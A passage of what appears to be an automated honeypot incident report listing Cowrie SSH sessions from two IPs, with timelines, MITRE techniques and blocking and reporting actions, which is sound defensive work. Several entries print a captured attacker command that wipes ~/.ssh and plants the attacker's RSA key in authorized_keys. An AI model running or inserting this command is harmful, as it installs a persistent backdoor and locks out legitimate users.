| `2026-04-12 20:56:13` | `cowrie.command.failed` |
| `2026-04-12 20:56:13` | `cowrie.log.closed` |
| `2026-04-12 20:56:14` | `cowrie.session.params` |
| `2026-04-12 20:56:14` | `cowrie.command.input` |
| `2026-04-12 20:56:14` | `cowrie.session.file_download` |
| `2026-04-12 20:56:14` | `cowrie.log.closed` |
| `2026-04-12 20:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-282192c96ffb

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 20:56 |
| **Last Seen** | 2026-04-12 20:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:56:17` | `cowrie.session.connect` |
| `2026-04-12 20:56:17` | `cowrie.client.version` |
| `2026-04-12 20:56:17` | `cowrie.client.kex` |
| `2026-04-12 20:56:19` | `cowrie.login.success` |
| `2026-04-12 20:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ae4c2d5977e

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:57 |
| **Last Seen** | 2026-04-12 20:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:57:54` | `cowrie.session.connect` |
| `2026-04-12 20:57:54` | `cowrie.client.version` |
| `2026-04-12 20:57:54` | `cowrie.client.kex` |
| `2026-04-12 20:57:55` | `cowrie.login.success` |
| `2026-04-12 20:57:55` | `cowrie.session.params` |
| `2026-04-12 20:57:55` | `cowrie.command.input` |
| `2026-04-12 20:57:55` | `cowrie.command.failed` |
| `2026-04-12 20:57:55` | `cowrie.log.closed` |
| `2026-04-12 20:57:56` | `cowrie.session.params` |
| `2026-04-12 20:57:56` | `cowrie.command.input` |
| `2026-04-12 20:57:56` | `cowrie.session.file_download` |
| `2026-04-12 20:57:56` | `cowrie.log.closed` |
| `2026-04-12 20:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d434759c0df

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:57 |
| **Last Seen** | 2026-04-12 20:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:57:58` | `cowrie.session.connect` |
| `2026-04-12 20:57:58` | `cowrie.client.version` |
| `2026-04-12 20:57:58` | `cowrie.client.kex` |
| `2026-04-12 20:57:59` | `cowrie.login.success` |
| `2026-04-12 20:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70f03a3e3eb8

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:58 |
| **Last Seen** | 2026-04-12 20:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:58:35` | `cowrie.session.connect` |
| `2026-04-12 20:58:35` | `cowrie.client.version` |
| `2026-04-12 20:58:36` | `cowrie.client.kex` |
| `2026-04-12 20:58:36` | `cowrie.login.success` |
| `2026-04-12 20:58:36` | `cowrie.session.params` |
| `2026-04-12 20:58:36` | `cowrie.command.input` |
| `2026-04-12 20:58:36` | `cowrie.command.failed` |
| `2026-04-12 20:58:37` | `cowrie.log.closed` |
| `2026-04-12 20:58:37` | `cowrie.session.params` |
| `2026-04-12 20:58:37` | `cowrie.command.input` |
| `2026-04-12 20:58:37` | `cowrie.session.file_download` |
| `2026-04-12 20:58:37` | `cowrie.log.closed` |
| `2026-04-12 20:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-783b039e0966

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:58 |
| **Last Seen** | 2026-04-12 20:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:58:39` | `cowrie.session.connect` |
| `2026-04-12 20:58:39` | `cowrie.client.version` |
| `2026-04-12 20:58:39` | `cowrie.client.kex` |
| `2026-04-12 20:58:40` | `cowrie.login.success` |
| `2026-04-12 20:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7673d0af7242

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 20:59 |
| **Last Seen** | 2026-04-12 20:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:59:12` | `cowrie.session.connect` |
| `2026-04-12 20:59:12` | `cowrie.client.version` |
| `2026-04-12 20:59:12` | `cowrie.client.kex` |
| `2026-04-12 20:59:13` | `cowrie.login.success` |
| `2026-04-12 20:59:14` | `cowrie.session.params` |
| `2026-04-12 20:59:14` | `cowrie.command.input` |
| `2026-04-12 20:59:14` | `cowrie.command.failed` |
| `2026-04-12 20:59:14` | `cowrie.log.closed` |
| `2026-04-12 20:59:15` | `cowrie.session.params` |
| `2026-04-12 20:59:15` | `cowrie.command.input` |
| `2026-04-12 20:59:15` | `cowrie.session.file_download` |
| `2026-04-12 20:59:15` | `cowrie.log.closed` |
| `2026-04-12 20:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33545e7dea81

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 20:59 |
| **Last Seen** | 2026-04-12 20:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:59:18` | `cowrie.session.connect` |
| `2026-04-12 20:59:18` | `cowrie.client.version` |
| `2026-04-12 20:59:19` | `cowrie.client.kex` |
| `2026-04-12 20:59:20` | `cowrie.login.success` |
| `2026-04-12 20:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f27c3733e89

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 21:00 |
| **Last Seen** | 2026-04-12 21:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:00:01` | `cowrie.session.connect` |
| `2026-04-12 21:00:01` | `cowrie.client.version` |
| `2026-04-12 21:00:01` | `cowrie.client.kex` |
| `2026-04-12 21:00:01` | `cowrie.login.success` |
| `2026-04-12 21:00:02` | `cowrie.session.params` |
| `2026-04-12 21:00:02` | `cowrie.command.input` |
| `2026-04-12 21:00:02` | `cowrie.command.failed` |
| `2026-04-12 21:00:02` | `cowrie.log.closed` |
| `2026-04-12 21:00:02` | `cowrie.session.params` |
| `2026-04-12 21:00:02` | `cowrie.command.input` |
| `2026-04-12 21:00:02` | `cowrie.session.file_download` |
| `2026-04-12 21:00:02` | `cowrie.log.closed` |
| `2026-04-12 21:00:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6ad38411b02

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 21:00 |
| **Last Seen** | 2026-04-12 21:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:00:05` | `cowrie.session.connect` |
| `2026-04-12 21:00:05` | `cowrie.client.version` |
| `2026-04-12 21:00:05` | `cowrie.client.kex` |
| `2026-04-12 21:00:05` | `cowrie.login.success` |
| `2026-04-12 21:00:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1daf45dabbe

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:00 |
| **Last Seen** | 2026-04-12 21:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:00:51` | `cowrie.session.connect` |
| `2026-04-12 21:00:51` | `cowrie.client.version` |
| `2026-04-12 21:00:52` | `cowrie.client.kex` |
| `2026-04-12 21:00:53` | `cowrie.login.success` |
| `2026-04-12 21:00:53` | `cowrie.session.params` |
| `2026-04-12 21:00:53` | `cowrie.command.input` |
| `2026-04-12 21:00:53` | `cowrie.command.failed` |
| `2026-04-12 21:00:54` | `cowrie.log.closed` |
| `2026-04-12 21:00:54` | `cowrie.session.params` |
| `2026-04-12 21:00:54` | `cowrie.command.input` |
| `2026-04-12 21:00:55` | `cowrie.session.file_download` |
| `2026-04-12 21:00:55` | `cowrie.log.closed` |
| `2026-04-12 21:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50424f232afe

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:00 |
| **Last Seen** | 2026-04-12 21:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:00:58` | `cowrie.session.connect` |
| `2026-04-12 21:00:58` | `cowrie.client.version` |
| `2026-04-12 21:00:58` | `cowrie.client.kex` |
| `2026-04-12 21:00:59` | `cowrie.login.success` |
| `2026-04-12 21:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47b8bf5ff233

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:02 |
| **Last Seen** | 2026-04-12 21:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:02:33` | `cowrie.session.connect` |
| `2026-04-12 21:02:33` | `cowrie.client.version` |
| `2026-04-12 21:02:33` | `cowrie.client.kex` |
| `2026-04-12 21:02:34` | `cowrie.login.success` |
| `2026-04-12 21:02:35` | `cowrie.session.params` |
| `2026-04-12 21:02:35` | `cowrie.command.input` |
| `2026-04-12 21:02:35` | `cowrie.command.failed` |
| `2026-04-12 21:02:35` | `cowrie.log.closed` |
| `2026-04-12 21:02:36` | `cowrie.session.params` |
| `2026-04-12 21:02:36` | `cowrie.command.input` |
| `2026-04-12 21:02:36` | `cowrie.session.file_download` |
| `2026-04-12 21:02:36` | `cowrie.log.closed` |
| `2026-04-12 21:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a9f84d8bd3f

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:02 |
| **Last Seen** | 2026-04-12 21:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:02:39` | `cowrie.session.connect` |
| `2026-04-12 21:02:39` | `cowrie.client.version` |
| `2026-04-12 21:02:40` | `cowrie.client.kex` |
| `2026-04-12 21:02:41` | `cowrie.login.success` |
| `2026-04-12 21:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9e46d007e8e

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:04 |
| **Last Seen** | 2026-04-12 21:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:04:09` | `cowrie.session.connect` |
| `2026-04-12 21:04:09` | `cowrie.client.version` |
| `2026-04-12 21:04:10` | `cowrie.client.kex` |
| `2026-04-12 21:04:11` | `cowrie.login.success` |
| `2026-04-12 21:04:11` | `cowrie.session.params` |
| `2026-04-12 21:04:11` | `cowrie.command.input` |
| `2026-04-12 21:04:11` | `cowrie.command.failed` |
| `2026-04-12 21:04:12` | `cowrie.log.closed` |
| `2026-04-12 21:04:12` | `cowrie.session.params` |
| `2026-04-12 21:04:12` | `cowrie.command.input` |
| `2026-04-12 21:04:13` | `cowrie.session.file_download` |
| `2026-04-12 21:04:13` | `cowrie.log.closed` |
| `2026-04-12 21:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1d3e34ef30d

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:04 |
| **Last Seen** | 2026-04-12 21:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:04:16` | `cowrie.session.connect` |
| `2026-04-12 21:04:16` | `cowrie.client.version` |
| `2026-04-12 21:04:16` | `cowrie.client.kex` |
| `2026-04-12 21:04:17` | `cowrie.login.success` |
| `2026-04-12 21:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2e5dca7af32

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:05 |
| **Last Seen** | 2026-04-12 21:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:05:47` | `cowrie.session.connect` |
| `2026-04-12 21:05:47` | `cowrie.client.version` |
| `2026-04-12 21:05:47` | `cowrie.client.kex` |
| `2026-04-12 21:05:49` | `cowrie.login.success` |
| `2026-04-12 21:05:49` | `cowrie.session.params` |
| `2026-04-12 21:05:49` | `cowrie.command.input` |
| `2026-04-12 21:05:49` | `cowrie.command.failed` |
| `2026-04-12 21:05:49` | `cowrie.log.closed` |
| `2026-04-12 21:05:50` | `cowrie.session.params` |
| `2026-04-12 21:05:50` | `cowrie.command.input` |
| `2026-04-12 21:05:50` | `cowrie.session.file_download` |
| `2026-04-12 21:05:50` | `cowrie.log.closed` |
| `2026-04-12 21:05:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7369f1623fd1

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:05 |
| **Last Seen** | 2026-04-12 21:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:05:54` | `cowrie.session.connect` |
| `2026-04-12 21:05:54` | `cowrie.client.version` |
| `2026-04-12 21:05:54` | `cowrie.client.kex` |
| `2026-04-12 21:05:55` | `cowrie.login.success` |
| `2026-04-12 21:05:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b64c9514d0d5

